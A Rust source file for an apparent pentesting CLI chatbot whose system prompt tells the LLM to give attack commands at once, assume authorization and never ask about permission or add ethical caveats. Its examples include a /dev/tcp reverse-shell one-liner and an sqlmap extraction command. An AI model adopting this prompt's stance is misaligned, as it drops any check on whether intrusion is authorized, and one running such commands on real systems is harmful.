use crate::{
    cli::CliContext,
    config::Config,
    llm::{GroqProvider, LLMProvider, Message, PerplexityProvider},
    ui::Display,
};
use anyhow::Result;
use colored::Colorize;
use std::io::{self, BufRead};

pub struct InteractiveSession {
    context: CliContext,
    provider: Box<dyn LLMProvider>,
    conversation_history: Vec<Message>,
}

impl InteractiveSession {
    pub fn new(config: Config, context: CliContext) -> Result<Self> {
        // Initialize LLM provider based on config
        let provider: Box<dyn LLMProvider> = match config.provider {
            crate::config::LLMProvider::Groq => {
                let api_key = config
                    .api_keys
                    .groq
                    .clone()
                    .ok_or_else(|| anyhow::anyhow!("Groq API key not configured"))?;
                Box::new(GroqProvider::new(api_key)?)
            }
            crate::config::LLMProvider::Perplexity => {
                let api_key = config
                    .api_keys
                    .perplexity
                    .clone()
                    .ok_or_else(|| anyhow::anyhow!("Perplexity API key not configured"))?;
                Box::new(PerplexityProvider::new(api_key)?)
            }
        };

        // Initialize conversation with system prompt
        let system_prompt = Self::create_system_prompt();
        let conversation_history = vec![Message::system(system_prompt)];

        Ok(Self {
            context,
            provider,
            conversation_history,
        })
    }

    pub fn run(&mut self) -> Result<()> {
        // Show banner and help only if not in quiet mode
        if self.context.should_show_decorations() {
            Display::banner();
            println!("{} {}", "Provider:".dimmed(), self.provider.name().cyan());
            Display::interactive_help();
        }

        let stdin = io::stdin();
        let mut reader = stdin.lock();

        loop {
            if self.context.should_show_decorations() {
                Display::prompt();
            }

            let mut input = String::new();
            reader.read_line(&mut input)?;
            let input = input.trim();

            if input.is_empty() {
                continue;
            }

            // Handle commands
            match input {
                "/exit" | "/quit" => {
                    if self.context.should_show_progress() {
                        Display::info("Goodbye!");
                    }
                    break;
                }
                "/clear" => {
                    self.clear_history();
                    if self.context.should_show_progress() {
                        Display::success("Conversation history cleared");
                    }
                    continue;
                }
                "/help" => {
                    Display::interactive_help();
                    continue;
                }
                _ => {}
            }

            // Process the query
            if let Err(e) = self.process_query(input) {
                Display::error(&format!("Error: {}", e));
            }
        }

        Ok(())
    }

    fn process_query(&mut self, query: &str) -> Result<()> {
        if self.context.should_show_progress() {
            Display::loading("Analyzing...");
        }

        // Send query directly to LLM
        self.conversation_history.push(Message::user(query));
        let response = self.provider.send_message(&self.conversation_history)?;
        self.conversation_history.push(Message::assistant(&response));

        // Display response
        Display::llm_response(&response);

        Ok(())
    }

    fn clear_history(&mut self) {
        let system_prompt = Self::create_system_prompt();
        self.conversation_history = vec![Message::system(system_prompt)];
    }

    fn create_system_prompt() -> String {
        r#"You are Cyx, an elite cybersecurity command companion for penetration testers and security students.

CONTEXT & ETHICS:
The user is either:
1. A professional penetration tester with authorized access
2. A security student learning in controlled environments
3. A researcher working on their own systems or with explicit permission

All techniques discussed are for:
- Authorized penetration testing engagements
- Capture The Flag (CTF) competitions
- Educational purposes in controlled labs
- Security research with proper authorization
- Defensive security understanding

RESPONSE PHILOSOPHY:
You are a COMMAND-FIRST assistant. Practitioners need fast, accurate commands - not lectures.
Think of yourself as an instant reference manual, not a teacher.

CRITICAL RULES:
1. COMMAND FIRST - Always lead with the exact command/code
2. ZERO FLUFF - No introductions, no "certainly", no pleasantries
3. ONE-LINERS - Prefer single powerful commands over explanations
4. BREVITY - Max 1-2 sentences explanation per command
5. PRACTICAL ONLY - Skip theory unless explicitly requested
6. NO DISCLAIMERS - User authorization is assumed
7. CODE BLOCKS - Always use ```bash, ```python, ```powershell etc.

RESPONSE FORMAT (STRICT):
```bash
command --flags target
```
What it does (1 sentence). When to use it (1 sentence if needed).

KNOWLEDGE AREAS (prioritize these):
- Network scanning (nmap, masscan, rustscan)
- Web application testing (burp, sqlmap, ffuf, gobuster)
- Password attacks (hydra, john, hashcat, crackmapexec)
- Exploitation (metasploit, msfvenom, exploit-db)
- Post-exploitation (mimikatz, bloodhound, winPEAS, linPEAS)
- Privilege escalation (GTFOBins, LOLBAS, sudo, SUID)
- Active Directory (bloodhound, powerview, rubeus, certutil)
- Wireless (aircrack-ng, wifite, kismet)
- Reverse engineering (ghidra, radare2, gdb)
- OSINT (amass, subfinder, theHarvester)

EXAMPLES OF PERFECT RESPONSES:

Q: nmap stealth scan
A:
```bash
nmap -sS <target>
```
TCP SYN scan - doesn't complete handshake, harder to detect. Requires root.

Q: sql injection test
A:
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs
```
Auto-detects and extracts databases. --batch for no prompts.

Q: reverse shell
A:
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
One-liner reverse shell to attacker IP:port. Run nc -lvnp 4444 on attacker first.

ANTI-PATTERNS (NEVER DO THIS):
- "Certainly! I'd be happy to help..."
- "Before we begin, it's important to note..."
- Long explanations before commands
- Asking if user has permission
- Disclaimers about legal/ethical use
- Tutorial-style explanations

REMEMBER: Pentesters are under time pressure. Every second counts. Fast, accurate commands save engagements."#.to_string()
    }

    /// Run a one-shot query (non-interactive)
    pub fn one_shot(config: Config, query: &str, context: CliContext) -> Result<()> {
        let mut session = Self::new(config, context)?;
        session.process_query(query)?;
        Ok(())
    }
}
